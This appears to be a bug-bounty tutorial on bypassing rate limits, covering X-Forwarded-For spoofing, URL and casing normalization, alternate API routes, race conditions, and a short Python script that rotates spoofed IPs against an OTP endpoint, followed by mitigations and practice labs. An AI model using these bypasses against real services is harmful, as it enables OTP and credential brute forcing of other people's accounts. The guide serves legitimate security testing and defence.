# 📁 Rate-Limiting & Throttling Bypasses — Security Testing Guide

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** Rate-limiting testing must be conducted with extreme discipline and low request budgets. **Do not perform high-volume credential brute-forcing, distributed denial-of-service, or automated traffic floods against production services.** Use controlled test accounts to verify whether rate-limit counters can be trivially evaded with small, structured request batches (e.g., 5 to 10 requests).

---

## 📌 Executive Summary

**Rate Limiting** (or request throttling) is a defensive control designed to restrict the number of requests a client can make to a specific endpoint within a given time window. It protects critical authentication and account workflows from:
- Credential stuffing and password brute forcing.
- SMS / Email OTP brute force and cost abuse.
- Password reset token enumeration.
- Account creation and registration spam.
- Coupon code and gift card guessing.

A rate-limiting bypass occurs when the application relies on client-controlled identifiers (such as user-supplied IP headers or cookies) to track rate limits, or suffers from concurrency race conditions that allow multiple requests to slip past before counters increment.

---

## 🔍 Core Discovery & Testing Methodology

```
+---------------------------------------------------------------------------------+
|                       Rate-Limit Bypass Attack Vectors                          |
+---------------------------------------------------------------------------------+
        |                                |                                 |
        v                                v                                 v
  IP Header Spoofing             Path / Route Normalization         Race Conditions
  - X-Forwarded-For cycling      - /login?param=1                   - Parallel HTTP/2 packets
  - X-Real-IP / Client-IP        - /api/v1 vs /mobile/login         - Concurrent requests
```

---

## 💡 High-Value Bug Bounty Tips & Bypass Techniques

### 1. IP Header Spoofing (Client-Controlled Identity)
Many web applications use reverse proxy headers (`X-Forwarded-For`) to track client IP addresses instead of the TCP socket connection. If the proxy accepts and appends client-supplied headers without validation:
- Cycle arbitrary IP addresses with each request:
  ```http
  POST /api/v1/login HTTP/1.1
  Host: example.com
  X-Forwarded-For: 198.51.100.1
  ```
  ```http
  POST /api/v1/login HTTP/1.1
  Host: example.com
  X-Forwarded-For: 198.51.100.2
  ```

#### Other Spoofing Headers to Test:
- `X-Real-IP: 198.51.100.X`
- `X-Client-IP: 198.51.100.X`
- `X-Originating-IP: 198.51.100.X`
- `X-Remote-IP: 198.51.100.X`
- `X-Remote-Addr: 198.51.100.X`
- `True-Client-IP: 198.51.100.X`
- `CF-Connecting-IP: 198.51.100.X` (If behind Cloudflare and origin is directly reached)

---

### 2. Path & Parameter Normalization
Rate limiters often evaluate rules against exact URL string matches:
- **Query Parameter Variation:**
  - `POST /login?v=1`
  - `POST /login?v=2`
  - `POST /login?cache_buster=829`
- **Trailing Slashes & Matrix Params:**
  - `POST /login/`
  - `POST /login;.`
  - `POST /login..;/login`
- **Case Sensitivity:**
  - `POST /Login`
  - `POST /LOGIN`

---

### 3. Alternative Route & API Version Swapping
If `/api/v2/login` enforces strict rate limiting of 5 attempts per minute, check whether alternative routes share the same throttler:
- `/api/v1/login`
- `/mobile/api/login`
- `/auth/login.json`
- GraphQL mutation: `mutation { login(user: "...", pass: "...") { token } }`

---

### 4. Account Identifier Normalization
If the rate limit is tracked per account (e.g. `username` or `email`), check if the backend normalizes casing after the rate-limit check:
- `testuser@example.com`
- `TestUser@example.com`
- `TESTUSER@example.com`
- `testuser+1@example.com` (Gmail sub-addressing)
- `testuser%20@example.com` (Trailing whitespace)

---

### 5. Concurrency Race Conditions (Single-Packet Attack)
When an endpoint has a check-then-act vulnerability (e.g. reading current attempt count from database, validating, and writing updated count), sending multiple simultaneous requests over a single HTTP/2 connection can trigger all requests before the counter increments:
- Use Burp Suite Repeater's "Send group (parallel)" or Turbo Intruder.
- Send 10 simultaneous requests with different OTP codes.
- *Vulnerable Indicator:* All 10 requests process concurrently without triggering a `429 Too Many Requests` response.

---

## 🛠️ Safe Educational Verification Template

### Safe Controlled Verification Script (Python)
```python
import requests
import time

TARGET_URL = "https://example.com/api/v1/verify-otp"
HEADERS = {"Content-Type": "application/json"}

print("[*] Starting controlled rate-limit evasion test (Max 6 requests)...")

for i in range(1, 7):
    # Testing IP rotation evasion with safe test account
    spoofed_ip = f"198.51.100.{i}"
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": spoofed_ip
    }
    payload = {
        "email": "controlled-test-user@example.com",
        "code": f"00000{i}" # Synthetic non-existent codes
    }
    
    resp = requests.post(TARGET_URL, json=payload, headers=headers)
    print(f"Request {i} [IP: {spoofed_ip}] -> Status: {resp.status_code}")
    time.sleep(0.2)
```

---

## 🛡️ Mitigation & Remediation Guidelines

### 1. Bind Throttling to Authenticated Identity + Real Socket IP
Never rely exclusively on client-supplied headers. In Redis or rate-limiting middleware:
```python
# Redis Sliding Window Rate Limiting (SECURE)
def get_rate_limit_key(request, account_identifier):
    # Use real TCP connection remote_addr, NOT untrusted headers
    client_ip = request.remote_addr
    # Combine real IP with target account identifier
    return f"ratelimit:{account_identifier}:{client_ip}"
```

### 2. Configure Reverse Proxies to Overwrite `X-Forwarded-For`
Ensure external client headers are stripped or overwritten at your outermost perimeter (Cloudflare, AWS ALB, Nginx):
```nginx
# Nginx perimeter config: Overwrite with socket IP
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $remote_addr;
```

### 3. Atomic Database Operations (Prevent Race Conditions)
Use atomic increments in memory stores (Redis `INCR`) rather than read-then-write database queries:
```python
# Redis atomic increment
current_attempts = redis_client.incr(rate_limit_key)
if current_attempts == 1:
    redis_client.expire(rate_limit_key, 60) # 1 minute window

if current_attempts > 5:
    return "Too Many Requests", 429
```

---

## 📊 CVSS 3.1 Severity Reference

- **Rate-Limit Bypass on 4-digit / 6-digit MFA OTP:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (Score: **9.1 - Critical**)
- **Rate-Limit Bypass on Login (Credential Stuffing):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (Score: **8.2 - High**)
- **Rate-Limit Bypass on Password Reset (Email Flooding):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` (Score: **5.3 - Medium**)

---

## ✅ Bug Bounty Triage Checklist

- [ ] Used strictly dedicated test accounts and non-sensitive test credentials.
- [ ] Confirmed that baseline rate limit triggers after documented threshold.
- [ ] Tested IP rotation, path normalization, and casing variations.
- [ ] Kept request volume minimal (under 10 requests) to prevent disruption.
- [ ] Recorded exact status codes, headers, and response bodies in the report.
---

## 🧪 Hands-On Practice Labs & Real-World Challenges

Practice bypassing throttling controls, IP rate limits, and concurrency guards:

| Platform | Lab / Challenge Name | Difficulty | Key Focus Area |
| :--- | :--- | :--- | :--- |
| **PortSwigger Academy** | [2FA broken logic via brute-force](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic) | Practitioner | Bypassing 2FA code rate limiting via session state desync |
| **PortSwigger Academy** | [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing) | Practitioner | Header spoofing (`X-Forwarded-For`) to defeat brute-force blocks |
| **PortSwigger Academy** | [Race conditions: Limit overrun](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun) | Practitioner | Submitting parallel requests via Turbo Intruder to bypass limits |
| **OWASP** | [crAPI: OTP Rate Limit Bypass](https://github.com/OWASP/crAPI) | Realistic | Brute-forcing password reset OTPs without rate-limit throttling |
| **TryHackMe** | [Brute-force Protection Evasion](https://tryhackme.com/room/hydra) | Medium | Evading IP throttling via proxy headers and concurrency |
